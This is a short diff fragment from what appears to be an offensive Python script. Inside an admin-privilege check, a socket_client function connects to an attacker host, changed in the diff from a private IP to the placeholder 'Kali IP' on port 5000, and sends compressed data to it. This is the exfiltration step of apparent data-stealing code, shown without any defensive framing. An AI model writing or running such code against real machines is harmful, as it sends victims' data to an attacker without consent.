@@ -31,7 +31,7 @@ if is_admin():
 
     def socket_client(data):
         client_socket = socket.socket()  # instantiate
-        client_socket.connect(("172.16.56.47", 5000))
+        client_socket.connect(("Kali IP", 5000))
         client_socket.send(compressed)
         client_socket.close()
 
